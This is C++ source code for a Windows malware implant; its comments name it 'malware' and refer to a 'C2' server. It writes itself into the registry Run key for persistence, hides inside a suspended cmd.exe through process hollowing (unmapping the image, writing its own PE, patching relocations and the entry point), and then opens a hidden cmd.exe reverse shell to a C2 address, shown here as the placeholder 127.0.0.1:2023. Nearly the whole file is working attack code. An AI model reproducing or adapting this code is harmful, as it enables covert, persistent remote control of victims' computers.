#include "stdafx.h"
#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <iostream>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")
#pragma comment (lib, "Ws2_32.lib")
using namespace std;

//Define
using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
SOCKET tcpsock = 0;
//Define shell variables
HANDLE hStdInPipeRead = NULL;
HANDLE hStdInPipeWrite = NULL;
HANDLE hStdOutPipeRead = NULL;
HANDLE hStdOutPipeWrite = NULL;

//OS Functions
bool reg_add_value(HKEY HKEY_, const char *Key, const char *Value, const char *Data) { //Create reg key
	HKEY hKey;
	LONG lRes = RegOpenKeyExA(HKEY_, Key, 0, KEY_ALL_ACCESS, &hKey);
	DWORD Len = 4096;
	char *Buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Len);
	strncat(Buffer, Data, strlen(Data));
	RegSetValueExA(hKey, Value, 0, REG_SZ, (LPCBYTE)Buffer, strlen(Buffer) + 1);
	RegCloseKey(hKey);
	return true;
}
bool ReadFromPipe() {
	while (true) {
		char chBuf[1000] = { 0 };
		bool ok = ReadFile(hStdOutPipeRead, chBuf, 1000, 0, NULL);
		while (ok == true) {
			memset(chBuf, 0, 1000);
			ok = ReadFile(hStdOutPipeRead, chBuf, 1000, 0, NULL);
			if (send(tcpsock, chBuf, strlen(chBuf), 0) == -1)break;
		}
	}
}
void StartCommandPrompt() {
	char CommandRecived[1000] = { 0 };
	char CMD[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','c','m','d','.','e','x','e','\x0' };
	SIZE_T Recived_Len = 0;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
	CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
	STARTUPINFOA si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;
	PROCESS_INFORMATION pi = {};
	DWORD dwCreationFlags = 0;
	CreateProcessA(CMD, 0, 0, 0, true, CREATE_NO_WINDOW, 0, 0, &si, &pi);
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ReadFromPipe, 0, 0, 0);
	if (hThread) {
		while (1) {
			memset(CommandRecived, 0, 1000);
			Recived_Len = recv(tcpsock, CommandRecived, 1000, 0);
			if (!strncmp(CommandRecived, "exit", 4))break;
			if (Recived_Len == -1) break;
			WriteFile(hStdInPipeWrite, CommandRecived, Recived_Len, 0, 0);
		}
	}
	TerminateThread(hThread, -1);
	TerminateProcess(pi.hProcess, -1);
}


//Network functions:
void Connecter() {
	WSADATA wsaver;
	WSAStartup(MAKEWORD(2, 2), &wsaver);
	sockaddr_in addr;
	tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Tcp socket
	addr.sin_family = 2;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //C2 Ipv4
	addr.sin_port = htons(2023); //Port
	while (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR);//It will continue until the connection is established
}


int main()
{
	
	char DIRECTORY_PATH[MAX_PATH] = { 0 };
	char FULL_PATH[MAX_PATH] = { 0 };
	GetSystemDirectoryA(DIRECTORY_PATH, MAX_PATH);
	GetModuleFileNameExA(GetCurrentProcess(), 0, FULL_PATH, MAX_PATH);
	//Get Path of malware and if the path is inconsistent, it will execute the process hollowing technique
	if (strncmp(FULL_PATH, DIRECTORY_PATH, 11)) {
		reg_add_value(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "System32", FULL_PATH); //copy to startup
		LPSTARTUPINFOA si = new STARTUPINFOA();
		LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
		PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
		DWORD returnLenght = 0;
		strncat(DIRECTORY_PATH, "\\cmd.exe", 12); //Target Process : cmd.exe
		CreateProcessA(NULL, (LPSTR)DIRECTORY_PATH, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
		HANDLE destProcess = pi->hProcess;
		NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
		DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;
		LPVOID destImageBase = 0;
		SIZE_T bytesRead = NULL;
		ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
		HANDLE sourceFile = CreateFileA(FULL_PATH, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		DWORD sourceFileSize = GetFileSize(sourceFile, 0);
		LPDWORD fileBytesRead = 0;
		LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
		ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
		PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
		PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
		SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
		NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
		myNtUnmapViewOfSection(destProcess, destImageBase);
		LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		destImageBase = newDestImageBase;
		DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;
		sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
		WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
		PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
		PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
		for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
		{
			PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
			PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
			WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
			sourceImageSection++;
		}
		IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		sourceImageSection = sourceImageSectionOld;
		for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
		{
			BYTE* relocSectionName = (BYTE*)".reloc";
			if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
			{
				sourceImageSection++;
				continue;
			}
			DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
			DWORD relocationOffset = 0;
			while (relocationOffset < relocationTable.Size) {
				PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
				relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
				PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
				for (DWORD y = 0; y < relocationEntryCount; y++)
				{
					relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
					if (relocationEntries[y].Type == 0)
					{
						continue;
					}
					DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
					DWORD patchedBuffer = 0;
					ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
					patchedBuffer += deltaImageBase;
					WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
					int a = GetLastError();
				}
			}
		}
		LPCONTEXT context = new CONTEXT();
		context->ContextFlags = CONTEXT_INTEGER;
		GetThreadContext(pi->hThread, context);
		DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
		context->Eax = patchedEntryPoint;
		SetThreadContext(pi->hThread, context);
		ResumeThread(pi->hThread);
		exit(-1);
	}
	Connecter();//start connect to C2
	//start command prompt 
	//shell :
	char CommandRecived[1000] = { 0 };
	char CMD[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','c','m','d','.','e','x','e','\x0' };
	SIZE_T Recived_Len = 0;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
	CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
	STARTUPINFOA si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;
	PROCESS_INFORMATION pi = {};
	DWORD dwCreationFlags = 0;
	CreateProcessA(CMD, 0, 0, 0, true, CREATE_NO_WINDOW, 0, 0, &si, &pi);
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ReadFromPipe, 0, 0, 0);
	if (hThread) {
		while (1) {
			memset(CommandRecived, 0, 1000);
			Recived_Len = recv(tcpsock, CommandRecived, 1000, 0);
			if (!strncmp(CommandRecived, "exit", 4))break;
			if (Recived_Len == -1) break;
			WriteFile(hStdInPipeWrite, CommandRecived, Recived_Len, 0, 0);
		}
	}
	TerminateThread(hThread, -1);
	TerminateProcess(pi.hProcess, -1);
    return 0;
}

